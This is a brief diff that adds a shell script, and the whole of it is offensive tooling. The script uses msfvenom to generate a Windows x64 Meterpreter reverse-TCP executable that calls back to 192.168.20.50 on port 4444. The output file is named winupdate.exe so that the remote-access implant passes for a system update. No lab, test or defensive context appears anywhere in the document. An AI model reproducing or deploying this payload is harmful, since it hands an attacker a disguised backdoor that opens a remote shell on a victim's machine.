@@ -1,0 +1,6 @@
+mkdir -p payload && cd payload
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+lhost=192.168.20.50 \
+lport=4444 \
+-f exe -o winupdate.exe
